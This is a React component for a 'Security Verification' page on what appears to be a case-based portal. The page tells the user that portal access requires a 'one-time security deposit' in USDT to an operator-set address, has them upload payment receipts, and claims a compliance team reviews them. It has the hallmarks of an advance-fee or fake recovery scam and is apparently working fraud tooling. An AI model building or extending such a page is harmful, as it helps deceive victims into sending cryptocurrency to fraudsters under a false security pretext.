import React, { useState, useRef } from "react";
import { motion } from "framer-motion";
import { ShieldAlert, Copy, Check, Upload, Loader2, Clock, XCircle, LogOut } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { usePortal } from "./PortalContext";

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button
      onClick={copy}
      className="ml-1 p-0.5 rounded text-blue-300 hover:text-white transition-colors"
      title="Copy"
    >
      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  );
}

export function SessionRefreshView() {
  const { currentCase, setViewState, logout } = usePortal();
  const { toast } = useToast();

  const [file, setFile] = useState<File | null>(null);
  const [preview, setPreview] = useState<string | null>(null);
  const [txHash, setTxHash] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const fileRef = useRef<HTMLInputElement>(null);

  const status = currentCase?.sessionRefreshStatus;
  const address = currentCase?.sessionRefreshAddress;
  const amount = currentCase?.sessionRefreshAmount;
  const asset = currentCase?.sessionRefreshAsset ?? "USDT";
  const network = currentCase?.sessionRefreshNetwork ?? "TRC20";
  const note = currentCase?.sessionRefreshNote;

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const f = e.target.files?.[0];
    if (!f) return;
    if (f.size > 10 * 1024 * 1024) {
      toast({ title: "File too large", description: "Maximum file size is 10 MB.", variant: "destructive" });
      return;
    }
    const allowed = ["image/png", "image/jpeg", "image/webp", "application/pdf"];
    if (!allowed.includes(f.type)) {
      toast({ title: "Unsupported format", description: "Please upload PNG, JPEG, WebP, or PDF.", variant: "destructive" });
      return;
    }
    setFile(f);
    const reader = new FileReader();
    reader.onload = (ev) => setPreview(ev.target?.result as string);
    reader.readAsDataURL(f);
  };

  const handleSubmit = async () => {
    if (!file || !preview || !currentCase) return;
    setSubmitting(true);
    try {
      const res = await fetch(`/api/cases/${currentCase.id}/session-refresh/submit`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          txHash: txHash.trim() || undefined,
          receiptData: preview,
          fileName: file.name,
        }),
      });
      const data = await res.json();
      if (res.ok) {
        toast({ title: "Receipt submitted", description: "Your receipt is under review. We'll notify you once approved." });
        // Refresh the case so viewState re-evaluates on next load.
        // For now, just update local case status to show the submitted state.
        setViewState("sessionRefresh");
        window.location.reload();
      } else {
        toast({ title: "Submission failed", description: data.error ?? "Please try again.", variant: "destructive" });
      }
    } catch {
      toast({ title: "Network error", description: "Could not reach the server. Please try again.", variant: "destructive" });
    } finally {
      setSubmitting(false);
    }
  };

  const isSubmitted = status === "submitted";
  const isRejected  = status === "rejected";
  const canUpload   = !isSubmitted;

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-12"
      style={{
        background: "radial-gradient(ellipse at 20% 30%, rgba(30,60,180,0.18) 0%, transparent 60%), radial-gradient(ellipse at 80% 70%, rgba(120,40,200,0.12) 0%, transparent 55%), #060d1f",
      }}
    >
      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35, ease: "easeOut" }}
        className="w-full max-w-lg"
      >
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-full bg-amber-500/20 border border-amber-500/30 flex items-center justify-center">
              <ShieldAlert className="w-4 h-4 text-amber-400" />
            </div>
            <span className="text-sm font-semibold text-amber-400 tracking-wide uppercase">
              Security Verification
            </span>
          </div>
          <button
            onClick={logout}
            className="flex items-center gap-1.5 text-xs text-slate-400 hover:text-white transition-colors"
          >
            <LogOut className="w-3.5 h-3.5" />
            Sign out
          </button>
        </div>

        {/* Main card */}
        <div
          className="rounded-2xl border border-white/10 p-7 space-y-6"
          style={{
            background: "rgba(10, 20, 60, 0.72)",
            backdropFilter: "blur(20px)",
            boxShadow: "0 4px 40px rgba(0,0,0,0.45), inset 0 1px 0 rgba(255,255,255,0.06)",
          }}
        >
          <div className="space-y-1.5">
            <h1 className="text-xl font-bold text-white leading-tight">
              Deposit Required to Continue
            </h1>
            <p className="text-sm text-slate-400 leading-relaxed">
              A one-time security deposit is required before you can access your portal. Please send the
              specified amount to the address below and upload your payment receipt.
            </p>
          </div>

          {/* Deposit details */}
          {(address || amount) && (
            <div className="rounded-xl bg-white/5 border border-white/8 p-4 space-y-3">
              <p className="text-[11px] font-semibold uppercase tracking-widest text-slate-500">
                Deposit Instructions
              </p>
              {amount && (
                <div className="flex items-center justify-between gap-2">
                  <span className="text-xs text-slate-400">Amount</span>
                  <div className="flex items-center gap-1">
                    <span className="text-sm font-bold text-white">
                      {amount} {asset}
                    </span>
                    <span className="text-xs text-slate-500">({network})</span>
                    <CopyButton text={`${amount} ${asset}`} />
                  </div>
                </div>
              )}
              {address && (
                <div className="space-y-1.5">
                  <span className="text-xs text-slate-400">Deposit Address</span>
                  <div className="flex items-start gap-1">
                    <code className="text-xs text-blue-300 break-all leading-relaxed flex-1 font-mono">
                      {address}
                    </code>
                    <CopyButton text={address} />
                  </div>
                </div>
              )}
              {note && (
                <div className="pt-1 border-t border-white/8 text-xs text-slate-400 leading-relaxed">
                  {note}
                </div>
              )}
            </div>
          )}

          {/* Submitted / awaiting review state */}
          {isSubmitted && (
            <div className="rounded-xl bg-blue-500/10 border border-blue-500/25 p-4 flex gap-3">
              <Clock className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
              <div className="space-y-1">
                <p className="text-sm font-semibold text-blue-300">Receipt Under Review</p>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Your receipt has been submitted and is being reviewed by our compliance team. Portal access
                  will be restored once approved. This typically takes 1–3 business hours.
                </p>
              </div>
            </div>
          )}

          {/* Rejected state */}
          {isRejected && (
            <div className="rounded-xl bg-red-500/10 border border-red-500/25 p-4 flex gap-3">
              <XCircle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
              <div className="space-y-1">
                <p className="text-sm font-semibold text-red-300">Receipt Rejected</p>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Your previous receipt was not accepted. Please check the deposit details above and upload a
                  new receipt showing a completed transaction.
                </p>
              </div>
            </div>
          )}

          {/* Upload form */}
          {canUpload && (
            <div className="space-y-4">
              <div className="space-y-2">
                <Label className="text-xs text-slate-400 uppercase tracking-wide">
                  Transaction Hash (optional)
                </Label>
                <Input
                  value={txHash}
                  onChange={(e) => setTxHash(e.target.value)}
                  placeholder="e.g. 0xabc123… or TXID"
                  className="bg-slate-800/50 border-slate-700 text-white text-sm placeholder:text-slate-600"
                />
              </div>

              <div className="space-y-2">
                <Label className="text-xs text-slate-400 uppercase tracking-wide">
                  Payment Receipt <span className="text-red-400">*</span>
                </Label>
                <input
                  ref={fileRef}
                  type="file"
                  accept="image/png,image/jpeg,image/webp,application/pdf"
                  className="hidden"
                  onChange={handleFile}
                />
                {preview ? (
                  <div className="relative rounded-xl overflow-hidden border border-white/10 bg-black/30">
                    {file?.type === "application/pdf" ? (
                      <div className="h-24 flex items-center justify-center gap-2 text-sm text-slate-300">
                        <Upload className="w-4 h-4" />
                        {file.name}
                      </div>
                    ) : (
                      <img src={preview} alt="Receipt preview" className="max-h-48 w-full object-contain" />
                    )}
                    <button
                      onClick={() => { setFile(null); setPreview(null); if (fileRef.current) fileRef.current.value = ""; }}
                      className="absolute top-2 right-2 bg-black/60 text-white text-xs rounded px-2 py-0.5 hover:bg-black/80 transition-colors"
                    >
                      Change
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => fileRef.current?.click()}
                    className="w-full h-28 rounded-xl border-2 border-dashed border-slate-700 hover:border-blue-500/50 hover:bg-blue-500/5 transition-all flex flex-col items-center justify-center gap-2 text-slate-500 hover:text-slate-300"
                  >
                    <Upload className="w-6 h-6" />
                    <span className="text-xs">Click to upload PNG, JPEG, WebP, or PDF (max 10 MB)</span>
                  </button>
                )}
              </div>

              <Button
                onClick={handleSubmit}
                disabled={!file || submitting}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold disabled:opacity-50"
              >
                {submitting ? (
                  <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Submitting…</>
                ) : (
                  <><Upload className="w-4 h-4 mr-2" /> Submit Receipt</>
                )}
              </Button>
            </div>
          )}
        </div>

        <p className="text-center text-xs text-slate-600 mt-4">
          Need help? Contact our support team via your registered email address.
        </p>
      </motion.div>
    </div>
  );
}
